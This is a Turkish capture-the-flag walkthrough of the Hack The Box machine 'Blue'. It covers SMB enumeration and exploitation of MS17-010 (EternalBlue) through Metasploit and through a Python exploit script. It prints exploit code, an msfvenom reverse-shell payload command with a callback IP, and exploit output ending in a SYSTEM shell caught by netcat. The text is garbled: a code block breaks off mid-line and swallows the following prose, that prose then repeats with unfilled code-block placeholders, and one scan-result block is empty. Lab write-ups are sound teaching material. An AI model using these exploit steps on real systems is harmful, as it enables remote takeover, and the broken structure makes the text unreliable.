---
{"dg-publish":true,"permalink":"/ctf/blue-ctf/"}
---


Blue, 8 Kasım 2017'de HTB'de sahip olduğum ilk kutuydu. Ve gerçekten de platformdaki en kolay kutulardan biri. Root ilk kan iki dakika içinde gitti. MS17-010 (diğer adıyla ETERNALBLUE) exploitini makineye doğrultup System olarak bir shell alıyorsunuz. Nmap kullanarak makinenin MS17-010'a karşı savunmasız olduğunu nasıl bulacağınızı ve hem Metasploit hem de Python komut dosyalarını kullanarak nasıl exploit edeceğinizi göstereceğim.


## Box Info

|Name|[Blue](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fblue)[![Blue](https://0xdf.gitlab.io/icons/box-blue.png)](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fblue)  <br>[Play on HackTheBox](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Fblue)|
|---|---|
|Release Date|[28 Jul 2017](https://twitter.com/hackthebox_eu/status/1318841696990486529)|
|Retire Date|13 Jan 2018|
|OS|Windows ![Windows](https://0xdf.gitlab.io/icons/Windows.png)|
|Base Points|Easy [20]|
|Rated Difficulty|![Rated difficulty for Blue](https://0xdf.gitlab.io/img/blue-diff.png)|
|Radar Graph|![Radar chart for Blue](https://0xdf.gitlab.io/img/blue-radar.png)|
|![First Blood User](https://0xdf.gitlab.io/icons/first-blood-user.png)|00:02:34[![stefano118](https://www.hackthebox.com/badge/image/3603)](https://app.hackthebox.com/users/3603)|
|![First Blood Root](https://0xdf.gitlab.io/icons/first-blood-root.png)|00:02:01[![stefano118](https://www.hackthebox.com/badge/image/3603)](https://app.hackthebox.com/users/3603)|
|Creator|[![ch4p](https://www.hackthebox.com/badge/image/1)](https://app.hackthebox.com/users/1)|

## Recon

### nmap

nmap, RPC (135), NetBios (139) ve SMB'de (445) üç standart Windows portunun yanı sıra 49000'lerde bazı yüksek RPC ilişkili portlar buldu:

```
nmap -p- --min-rate 10000 10.10.10.40 

SYN Stealth Scan Timing: About 65.40% done; ETC: 07:39 (0:00:06 remaining)
Warning: 10.10.10.40 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.10.40
Host is up (0.39s latency).
Not shown: 39245 closed tcp ports (reset), 26282 filtered tcp ports (no-response)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
49152/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49156/tcp open  unknown
49157/tcp open  unknown

```


```
nmap -p 135,139,445 -sCV  10.10.10.40 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 07:40 EST
Nmap scan report for 10.10.10.40
Host is up (0.39s latency).

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
Service Info: Host: HARIS-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: haris-PC
|   NetBIOS computer name: HARIS-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-02-08T12:41:11+00:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2025-02-08T12:41:12
|_  start_date: 2025-02-08T12:32:17
|_clock-skew: mean: 4s, deviation: 3s, median: 2s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 28.76 seconds

```


SMB çıktısı bunun Windows 7 Professional olduğunu söylüyor.

### SMB - TCP 445

#### Shares

Birkaç paylaşımdan null session (boş oturum) okuma erişimi mevcut (burada smbmap'e yanlış kimlik bilgileri vererek işe yarayan bir hile var).

![Pasted image 20250208154601.png](/img/user/resimler/Pasted%20image%2020250208154601.png)

![Pasted image 20250208154554.png](/img/user/resimler/Pasted%20image%2020250208154554.png)

Share boş:

![Pasted image 20250208161030.png](/img/user/resimler/Pasted%20image%2020250208161030.png)

Users'ta sadece Default ve Public klasörleri boştur:

```
oxdf@parrot$ smbclient //10.10.10.40/users
Enter WORKGROUP\oxdf's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Fri Jul 21 02:56:23 2017
  ..                                 DR        0  Fri Jul 21 02:56:23 2017
  Default                           DHR        0  Tue Jul 14 03:07:31 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:54:24 2009
  Public                             DR        0  Tue Apr 12 03:51:29 2011

                8362495 blocks of size 4096. 4259398 blocks available
smb: \> ls default
  Default                           DHR        0  Tue Jul 14 03:07:31 2009

                8362495 blocks of size 4096. 4259398 blocks available
smb: \> ls public
  Public                             DR        0  Tue Apr 12 03:51:29 2011

                8362495 blocks of size 4096. 4259398 blocks available
```


#### Vulns

nmap, servisteki bilinen güvenlik açıklarını kontrol edecek vuln scriptlerine sahiptir. Onları burada çalıştıracağım ve büyük bir tane buluyor, MS-17-010:

```

```

## Shell as System

### Background


MS-17-010, diğer adıyla ETERNALBLUE, Windows SMB'deki kimlik doğrulaması gerektirmeyen uzak kod çalıştırma (RCE) açığıdır ve [Shadow Brokers](https://en.wikipedia.org/wiki/The_Shadow_Brokers) tarafından sızdırılmasıyla ünlüdür. Ayrıca, Mayıs 2017'de [WannaCry](https://en.wikipedia.org/wiki/WannaCry_ransomware_attack) solucanını tetikleyen açık olarak bilinir.

Metasploit'teki MS17-010 için olan exploitler, Python betiklerine kıyasla çok daha stabildir. Eğer bunu gerçek dünyada yapıyorsanız, burada Metasploit kullanmanızı şiddetle tavsiye ederim. Ancak, OSCP gibi Metasploit kullanımına izin vermeyen bir eğitim etkinliği yapıyorsanız, birkaç makinenin çökmesi kabul edilebilir. Her iki yöntemi de göstereceğim.


### Metasploit

Bunu yapmanın en kolay yolu Metasploit kullanmaktır. Msfconsole ile başlatacağım ve ardından MS17-010'u arayacağım:

![Pasted image 20250208163021.png](/img/user/resimler/Pasted%20image%2020250208163021.png)

Hedefi ve lokal IP'mi ayarlayacağım ve seçeneklerin geri kalanı iyi görünüyor:

![Pasted image 20250208163435.png](/img/user/resimler/Pasted%20image%2020250208163435.png)

![Pasted image 20250208163534.png](/img/user/resimler/Pasted%20image%2020250208163534.png)

Meterpreter'ı çok sık kullanmadığım için gerçek bir shell üzerinden çalışmayı daha kolay buluyorum:

Şimdi sadece bayrakları alın:

![Pasted image 20250208163714.png](/img/user/resimler/Pasted%20image%2020250208163714.png)


![Pasted image 20250208163659.png](/img/user/resimler/Pasted%20image%2020250208163659.png)

![Pasted image 20250208163759.png](/img/user/resimler/Pasted%20image%2020250208163759.png)


### Python Script

Bu yazıyı yazmak için geri döndüğümde, MS17-010'u yapmak için bir Python3 scripti bulamadım. Sanal makinem Python3 ile Impacket kullanacak şekilde yapılandırıldığı için bu biraz zor bir noktaya yol açtı.

#### Create Virtual Environment

Python2'yi Impacket ile kullanacak bir virtual environment oluşturdum. Önce Impacket'i /opt içine klonladım:

```
oxdf@parrot$ git clone https://github.com/SecureAuthCorp/impacket.git                               
Cloning into 'impacket'...
remote: Enumerating objects: 19128, done.
remote: Counting objects: 100% (247/247), done.
remote: Compressing objects: 100% (139/139), done.
remote: Total 19128 (delta 135), reused 187 (delta 107), pack-reused 18881
Receiving objects: 100% (19128/19128), 6.56 MiB | 10.85 MiB/s, done.
Resolving deltas: 100% (14511/14511), done.
```

Python3'te virtual environment oluşturmak için builtin venv modülü var. Fakat Python2 için apt ile virtualenv'i yüklemem gerekiyor. Şimdi Python2 istediğimi söylemek için -p bayrağını kullanarak Impacket dizininde bu ortam klasörünü oluşturacağım:

```
oxdf@parrot$ cd impacket
oxdf@parrot$ virtualenv impacket-venv -p $(which python2)
created virtual environment CPython2.7.18.final.0-64 in 650ms
  creator CPython2Posix(dest=/opt/impacket/impacket-venv, clear=False, no_vcs_ignore=False, global=False) 
  seeder FromAppData(download=False, pip=bundle, setuptools=bundle, wheel=bundle, via=copy, app_data_dir=/home/oxdf/.local/share/virtualenv)
    added seed packages: pip==20.3.4, setuptools==44.1.1, wheel==0.36.2
  activators BashActivator,CShellActivator,FishActivator,PowerShellActivator,PythonActivator
```


Şimdi etkinleştirdiğimde, güncelleme istemini alıyorum ve python python2.7:

```
oxdf@parrot$ source impacket-venv/bin/activate
(impacket-venv) oxdf@parrot$ python -V
Python 2.7.18
```

I’ll install `pip`:

```
(impacket-venv) oxdf@parrot$ wget https://bootstrap.pypa.io/pip/2.7/get-pip.py
...[snip]...
(impacket-venv) oxdf@parrot$ python get-pip.py
DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details
 about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality.
Collecting pip<21.0
  Using cached pip-20.3.4-py2.py3-none-any.whl (1.5 MB)
Installing collected packages: pip
  Attempting uninstall: pip
    Found existing installation: pip 20.3.4
    Uninstalling pip-20.3.4:
      Successfully uninstalled pip-20.3.4
Successfully installed pip-20.3.4
```

Now finally install Impacket:

```
(impacket-venv) oxdf@parrot$ pip install -r requirements.txt
...[snip]...
(impacket-venv) oxdf@parrot$ pip install .
...[snip]...
```

#### Script Analysis

Bildiğim en iyi MS17-010 Python scriptleri [worawit](https://github.com/worawit/MS17-010)'ten geliyor. Bunlar iyi çalışıyor, ancak kullanımı biraz kafa karıştırıcı. [helviojunior](https://github.com/helviojunior/MS17-010) bu depoyu forkladı ve gerçekten kullanışlı olan tek bir send_and_execute.py ekledi. Bu sadece orijinal zzz_exploit.py scripti için bir güncellemedir, ancak bir dosya yüklemek ve sistem olarak çalıştırmak için değiştirilmiştir.

zzz_exploit.py'de smb_pwn adında bir fonksiyon vardır:

```
def smb_pwn(conn, arch):
	smbConn = conn.get_smbconnection()
	
	print('creating file c:\\pwned.txt on the target')
	tid2 = smbConn.connectTree('C

"Bu, exploit ile gerçekleştirilen eylemdir. Bu durumda, herhangi bir değişiklik yapılmadan (mod olmadan), hedef sistemde **C:\pwned.txt** dosyasını oluşturuyor. Ancak yorum satırına alınmış (commented out) kodlar, bu dosyadaki fonksiyonların hedef sisteme dosya yüklemek (**smb_send_file**) ve bir servis olarak komut çalıştırmak (**service_exec**) için nasıl kullanılabileceğini gösteriyor.

Güncellenmiş **send_and_execute.py** dosyası, komut satırı argümanlarını işlemek için bazı eklemeler yapıyor ve ardından bu fonksiyonu içeriyor:"

```
def send_and_execute(conn, arch):
	smbConn = conn.get_smbconnection()

	filename = "%s.exe" % random_generator(6)
	print "Sending file %s..." % filename


    #In some cases you should change remote file location
    #For example:
    #smb_send_file(smbConn, lfile, 'C', '/windows/temp/%s' % filename)
	#service_exec(conn, r'cmd /c c:\windows\temp\%s' % filename)    
	
	smb_send_file(smbConn, lfile, 'C', '/%s' % filename)
	service_exec(conn, r'cmd /c c:\%s' % filename)
```

Orijinalinde olana çok benziyor, ancak lfile'ı C:\filename'ye yüklemek ve sonra çalıştırmak için güncellendi.

zzz_exploit.py dosyasını değiştirebilir, send_and_execute.py dosyasını kullanabilir ya da bu depodaki fonksiyonları kullanarak kendi scriptinizi oluşturabilirsiniz.


#### Cred Update

Tıpkı yukarıdaki smbmap'te olduğu gibi, bunu kullanıcı adı boş bir string olarak çalıştırmayı denediğimde, auth yapmıyor. Ancak, kullanıcı adına herhangi bir string eklersem, o zaman çalışacaktır.

OSCP ile uğraşırken (2.5 yıl önce), bu script'e boş cred ile düşen birçok kutu vardı. Sanırım smbmap ile gördüğünüze benzer şekilde hareket etmelidir. Ancak tıpkı orada olduğu gibi, emin değilseniz hem kötü cred'lerle hem de kötü cred'ler olmadan denemek her zaman daha iyidir (ve elbette iyi cred'leriniz varsa, bunları kullanın!).


#### Shell

msfvenom ile bir payload oluşturacağım:

```
oxdf@parrot$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.14 LPORT=443 -f exe -o rev.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: rev.exe
```

Günümüzde Windows sistemleri için x64 nispeten evrensel olsa da, bu kutunun piyasaya sürüldüğü 2017 yılında x86, özellikle Windows 7'de çok daha yaygındı .

shell_reverse_tcp raw komut shell'idir (meterpreter olmayan) ve staged değildir (yani geri bağlanıp geri kalanını alacak bir stub yerine tüm payload tek bir exe'dedir). Bunların her ikisinde de nc ile shell'i yakalayabilirim. Eğer staged bir payload isteseydim, shell/reverse_tcp yapardım.

Kullanıcı adı “0xdf” olarak güncellendiğinde, nc'yi başlatacağım ve send_and_execute.py dosyasını çalıştıracağım:

```
(impacket-venv) oxdf@parrot$ python send_and_execute.py 10.10.10.40 rev.exe 
Trying to connect to 10.10.10.40:445
Target OS: Windows 7 Professional 7601 Service Pack 1
Using named pipe: browser
Target is 64 bit
Got frag size: 0x10
GROOM_POOL_SIZE: 0x5030
BRIDE_TRANS_SIZE: 0xfa0
CONNECTION: 0xfffffa8001c3d8f0
SESSION: 0xfffff8a0019ee2a0
FLINK: 0xfffff8a00264f048
InParam: 0xfffff8a00283a15c
MID: 0xd07
unexpected alignment, diff: 0x-1ebfb8
leak failed... try again
CONNECTION: 0xfffffa8001c3d8f0
SESSION: 0xfffff8a0019ee2a0
FLINK: 0xfffff8a002850088
InParam: 0xfffff8a00284a15c
MID: 0xe03
success controlling groom transaction
modify trans1 struct for arbitrary read/write
make this SMB session to be SYSTEM
overwriting session security context
Sending file BI8O95.exe...
Opening SVCManager on 10.10.10.40.....
Creating service mIfk.....
Starting service mIfk.....
The NETBIOS connection with the remote host timed out.
Removing service mIfk.....
ServiceExec Error on: 10.10.10.40
nca_s_proto_error
Done
```

Sondan altıncı satırda, “ Servis Başlatılıyor” yazan yerde, nc'de bir bağlantı alıyorum:

```
oxdf@parrot$ rlwrap nc -lnvp 443
listening on [any] 443 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.40] 49162
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

)
	fid2 = smbConn.createFile(tid2, '/pwned.txt')
	smbConn.closeFile(tid2, fid2)
	smbConn.disconnectTree(tid2)
	
	#smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
	#service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
	# Note: there are many methods to get shell over SMB admin session
	# a simple method to get shell (but easily to be detected by AV) is
	# executing binary generated by "msfvenom -f exe-service ..."
```

"Bu, exploit ile gerçekleştirilen eylemdir. Bu durumda, herhangi bir değişiklik yapılmadan (mod olmadan), hedef sistemde **C:\pwned.txt** dosyasını oluşturuyor. Ancak yorum satırına alınmış (commented out) kodlar, bu dosyadaki fonksiyonların hedef sisteme dosya yüklemek (**smb_send_file**) ve bir servis olarak komut çalıştırmak (**service_exec**) için nasıl kullanılabileceğini gösteriyor.

Güncellenmiş **send_and_execute.py** dosyası, komut satırı argümanlarını işlemek için bazı eklemeler yapıyor ve ardından bu fonksiyonu içeriyor:"

{{CODE_BLOCK_10}}

Orijinalinde olana çok benziyor, ancak lfile'ı C:\filename'ye yüklemek ve sonra çalıştırmak için güncellendi.

zzz_exploit.py dosyasını değiştirebilir, send_and_execute.py dosyasını kullanabilir ya da bu depodaki fonksiyonları kullanarak kendi scriptinizi oluşturabilirsiniz.


#### Cred Update

Tıpkı yukarıdaki smbmap'te olduğu gibi, bunu kullanıcı adı boş bir string olarak çalıştırmayı denediğimde, auth yapmıyor. Ancak, kullanıcı adına herhangi bir string eklersem, o zaman çalışacaktır.

OSCP ile uğraşırken (2.5 yıl önce), bu script'e boş cred ile düşen birçok kutu vardı. Sanırım smbmap ile gördüğünüze benzer şekilde hareket etmelidir. Ancak tıpkı orada olduğu gibi, emin değilseniz hem kötü cred'lerle hem de kötü cred'ler olmadan denemek her zaman daha iyidir (ve elbette iyi cred'leriniz varsa, bunları kullanın!).


#### Shell

msfvenom ile bir payload oluşturacağım:

{{CODE_BLOCK_11}}

Günümüzde Windows sistemleri için x64 nispeten evrensel olsa da, bu kutunun piyasaya sürüldüğü 2017 yılında x86, özellikle Windows 7'de çok daha yaygındı .

shell_reverse_tcp raw komut shell'idir (meterpreter olmayan) ve staged değildir (yani geri bağlanıp geri kalanını alacak bir stub yerine tüm payload tek bir exe'dedir). Bunların her ikisinde de nc ile shell'i yakalayabilirim. Eğer staged bir payload isteseydim, shell/reverse_tcp yapardım.

Kullanıcı adı “0xdf” olarak güncellendiğinde, nc'yi başlatacağım ve send_and_execute.py dosyasını çalıştıracağım:

{{CODE_BLOCK_12}}

Sondan altıncı satırda, “ Servis Başlatılıyor” yazan yerde, nc'de bir bağlantı alıyorum:

{{CODE_BLOCK_13}}

